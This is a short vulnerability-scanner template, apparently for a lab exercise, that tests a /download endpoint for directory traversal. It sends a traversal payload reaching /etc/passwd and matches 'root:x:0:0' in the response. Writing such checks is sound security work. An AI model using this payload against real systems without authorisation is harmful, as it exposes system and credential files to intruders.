id: ch2-sensitive-file-read

info:
  name: Sensitive file disclosure via insecure path validation
  author: vignesh
  severity: high
  description: Improper prefix-based path validation allows directory traversal and exposure of sensitive system files.

requests:
  - method: GET
    path:
      - "/download?file=../files/../../etc/passwd"

    matchers:
      - type: word
        part: body
        words:
          - "root:x:0:0"
